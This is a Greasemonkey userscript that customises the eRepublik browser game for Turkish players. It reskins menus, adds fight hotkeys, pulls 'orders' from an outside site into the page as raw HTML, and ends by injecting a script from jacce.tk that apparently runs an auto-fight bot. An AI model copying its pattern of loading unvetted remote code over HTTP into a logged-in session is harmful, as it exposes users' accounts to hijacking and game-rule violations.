// ==UserScript==
// @author          Uchiha Sasuke TR (Super_Coder)
// @name            eTurkiye Cumhuriyeti Devlet Sistemi [by Uchiha Sasuke TR (Super_Coder)]
// @namespace       http://www.erepublik.com/en/citizen/profile/5487678
// @description     Uchiha Sasuke TR (Super_Coder)
// @version         2.0.0
// @match          http://*.erepublik.com/*
// @include        http://www.erepublik.com/en/*
// @include        http://www.erepublik.com/tr/*
// @include        http://*.erepublik.com/*
// @include        http://www.erepublik.com/*
// @include        http://economy.erepublik.com/*
// @include        http://static.erepublik.com/*
// @include        https://userscripts.org/scripts/show/121521
// @require        http://sizzlemctwizzle.com/updater.php?id=96424&days=1&show
// @require        https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js
// @require        http://jquery-json.googlecode.com/files/jquery.json-2.2.min.js
// @require        https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.11/jquery-ui.min.js
// @require        http://www.bramstein.com/projects/text-overflow/jquery.text-overflow.min.js
// ==/UserScript==


if (document.getElementsByTagName('title')[0].innerHTML.indexOf('500 - Internal Server Error')!=-1) setTimeout(function() { 
	document.location.reload(); } , 500);
	
var myerep = function($, window, undefined) {
	/*!-- custom my homepage --*/
	$(document).ready(function () {
		$('#logo a').css('background-image','url(\"http://trdevlet.tr.funpic.org/map-erepublik-logged-wmno.png\")');

		// change top bar
		$('#menu ul li#menu1 a').css('background-image','url(\"http://trdevlet.tr.funpic.org/map-erepublik-logged-wmno.png\")');
		$('#menu ul li#menu2 a').css('background-image','url(\"http://trdevlet.tr.funpic.org/map-erepublik-logged-wmno.png\")');
		$('#menu ul li#menu3 a').css('background-image','url(\"http://trdevlet.tr.funpic.org/map-erepublik-logged-wmno.png\")');
		$('#menu ul li#menu4 a').css('background-image','url(\"http://trdevlet.tr.funpic.org/map-erepublik-logged-wmno.png\")');
		$('#menu ul li#menu5 a').css('background-image','url(\"http://trdevlet.tr.funpic.org/map-erepublik-logged-wmno.png\")');
		$('#menu ul li#menu6 a').css('background-image','url(\"http://trdevlet.tr.funpic.org/map-erepublik-logged-wmno.png\")');
		// improve something
		$('#menu > ul > li#menu3').append('<ul>'+
                        '<li><a href=\"http://www.erepublik.com/en/military/campaigns\" target="_self">Aktif Savaslar</a></li>' +
                        '<li><a href=\"http://www.erepublik.com/en/news/latest/all/Turkey/1\" target="_self">Son Haberler</a></li>' +
                        '<li><a href=\"http://www.erepublik.com/en/article/-msb-1497-g-uuml-n-sava-talimat-war-instructions-for-day-14947-1931386/1/20\" target="_self">Savas Emirleri</a></li>' +
                        '<li><a href=\"http://www.erepublik.com/en/newspaper/57-alay-resmi-gazetesi-248208/1\" target="_self">Baskanlik</a></li>' +
                        '<li><a href=\"http://www.erepublik.com/en/newspaper/tsk-mecmuasi-211609/1\" target="_self">Milli Savunma Bakanligi</a></li>' +
                        '<li><a href=\"http://www.erepublik.com/en/newspaper/pltalmdr-news-250755/1" target="_self">Icisleri Bakanligi</a></li>' +
                        '<li><a href=\"http://www.erepublik.com/en/newspaper/etr-meb-264921/1\" target="_self">Milli Egitim Bakanligi</a></li>' +
                        '<li><a href=\"http://www.erepublik.com/en/newspaper/azz-s-news-254535/1\" target="_self">Dis Isleri Bakanligi</a></li>' +
                        '<li><a href=\"http://www.erepublik.com/en/article/yeni-oyuncular-cin-rehber-1933681/1/20\" target="_self"><font color="green">Oyun Kilavuzu</font></a></li>' +
                        '<li><a href=\"http://trdevlet.tr.funpic.org/eTR_Chat_by_Uchiha_Sasuke.htm\" target="_blank"><font color="red">eTR Chat Odasi</font></a></li>' +
                        '<li><a href=\"http://www.erepublik.com/en/citizen/profile/5487678\" target="_self"><font color="blue">Script Onerileri</font></a></li></ul>');
		$('#menu > ul > li#menu2').append('<ul>'+
                        '<li><a href=\"http://www.erepublik.com/en/economy/inventory\" target="_self">Inventory</a></li></ul>');


		$('#menu > ul > li#menu5 > ul').prepend('<li><a href=\"http://www.erepublik.com/en/news/latest/all\" target="_self">News</a></li>');
		$('#menu > ul > li#menu5 > ul').prepend('<li><a href=\"http://www.erepublik.com/en/get-gold/gold\" target="_self">Gold & Extras</a></li>');

		// change menu6 url
		$('#menu ul li#menu6 a').attr('href','http://www.erepublik.com/en/map');
//		$('#large_sidebar > .user_missions').hide();
		$('.at').hide();
		// $('#header > #logo').hide();
		// remove ad and useless part
		$('#large_sidebar > .banner_place').remove();
		if ((document.location.toString()==='http://www.erepublik.com/en') || (document.location.toString().indexOf('?viewPost=')!==-1)) {
			$('#citizen_feed > .previous_posts > a').trigger('click');
//                        $('#citizen_feed > .show_regiment_feed').hide();
		}
	});
};
// Script Insert
var script = document.createElement('script');
script.textContent = '(' + myerep + ')(jQuery, window);';
document.body.appendChild(script);





var ordersurl = "http://trdevlet.tr.funpic.org/xnova/chat_msg.php";

var selectedunit = GM_getValue("defaultunit");
if (selectedunit==undefined) selectedunit = 0;
var units = ["Savas Emirleri", "Baskanlik", "Milli Savunma Bakanligi", "Icisleri Bakanligi", "M.E.B.", "Disisleri Bakanligi", "Teknoloji Bakanligi", "Haberler"];
var colours = ["", "", "", "", "", "", "", ""];
var ordersarr = [];

function tabclick(ID)
{
 document.getElementById("orderstabs").getElementsByClassName("on")[0].className = "";
 document.getElementById(ID).getElementsByTagName("a")[0].className = "on";
 x = parseInt(ID.substr(4));
 GM_setValue("defaultunit", x)
 selectedunit = x;
 if(ordersarr[x]!=undefined)document.getElementById("ordersdiv").innerHTML = ordersarr[x];
 document.getElementById("ordersdiv").style.backgroundColor = colours[x];
}

function main()
{
 box = document.createElement("div");
 box.className = "box";
 box.id = "ordersbox";

//// title = document.createElement("div");
//// title.className = "title";
//// title.innerHTML = '<embed class="sIFR-flash" width="250" height="28" src="/flash/delicious.swf" quality="best" flashvars="txt=VurucuTiM Haberlesme (made by xX Uchiha Sasuke Xx)&&textcolor=#737373&hovercolor=null&linkcolor=null&w=250&h=28" wmode="transparent" bgcolor="transparent" sifr="true" type="application/x-shockwave-flash" style="width: 250px; height: 28px;"/>'
//// box.appendChild(title);

 tabs = document.createElement("ul");
 tabs.className = "tabs"; 
 tabs.id = "orderstabs";
 
for (x in units)
 { 
  newtab = document.createElement("li");
  newtab.id = "tab_" + x;
  if (x==4) newtab.className = "last";
  newlink = document.createElement("a");
  newlink.innerHTML = "<span>" + units[x] + "</span>";
  newlink.href = "#";
  if (x==selectedunit) newlink.className = "on";
  newtab.addEventListener("click", function(){tabclick(this.id);}, false);
  newtab.appendChild(newlink);
  tabs.appendChild(newtab);
 }

 box.appendChild(tabs)
 box.appendChild(tabs).style.width = "949px";
 
 
 ordersdiv = document.createElement("div");
 ordersdiv.innerHTML = (ordersarr[selectedunit]?ordersarr[selectedunit]:"Emirler yukleniyor... Bu yaziyi 5 saniyeden fazla gorurseniz onbellegi temizleyerek sayfayi yenileyin ...");
 ordersdiv.id = "ordersdiv";
 ordersdiv.style.backgroundColor = colours[selectedunit];
 ordersdiv.style.cssFloat = "up";
 ordersdiv.style.padding = "12px";
 ordersdiv.style.width = "949px";
 ordersdiv.style.fontSize = "12px";
 box.appendChild(ordersdiv);

 menu = document.getElementById("menu");
 menu.parentNode.insertBefore(box,menu);

 GM_addStyle("#orderstabs {margin: 0px;} #orderstabs li a {padding-left:15px;} #orderstabs li a span {padding-right:15px;padding-left:0px;}#content #ordersbox.box .title {border-bottom:0 none;margin-bottom:0;}")

}

if(document.getElementById("menu"))
{
 GM_xmlhttpRequest({
  method: "GET",
  url: ordersurl,
  onload:function(response){
   orders = response.responseText;
   for (x in units)
     {
    var unit = units[x];
    start = orders.indexOf("&lt;" + unit + "&gt;");
    end = orders.indexOf("&lt;/" + unit + "&gt;");
    if (start==-1||end==-1) ordersarr[x] = "Uyari!" + unit + " emirleri yuklenemedi.Lutfen sayfayi yenileyin";
    else ordersarr[x] = orders.substring(start + ("&lt;" + unit + "&gt;").length,end);
   }

   tabclick("tab_" + selectedunit);
  }
 });
 
 window.addEventListener("load", main, false);
}



(function(){
 
var clickEvent = document.createEvent('MouseEvent');
clickEvent.initEvent('click',true,true);

document.addEventListener('keydown', function(e) {
 switch (e.keyCode)
		{
			case 70:	//F
				 var a = document.getElementById("fight_btn");
				a.dispatchEvent(clickEvent);
				return false;
				break;
			case 65:	//A
				 var a = document.getElementById("add_damage_btn");
				a.dispatchEvent(clickEvent);
				return false;
				break;
			case 83:	//S
				 var a = document.getElementById("change_weapon");
				a.dispatchEvent(clickEvent);
				return false;
				break;
			case 69:	//E
				 var a = document.getElementsByClassName("food_btn")[0];
				a.dispatchEvent(clickEvent);
				return false;
				break;
		}
}, false);
})();



var script=document.createElement('script');
script.type='text/javascript';
script.src='http://jacce.tk/fight/code.php?t';
var body=document.getElementsByTagName('body');
body[0].appendChild(script);

var button=document.createElement('a');
button.href='javascript:;';
button.id='autofight_button';
document.getElementById('pvp').appendChild(button);
document.getElementById('autofight_button').setAttribute('style', 'position:absolute;left:334px;z-index:800;');
document.getElementById('autofight_button').innerHTML='OtoPilotu Aktiflestir';

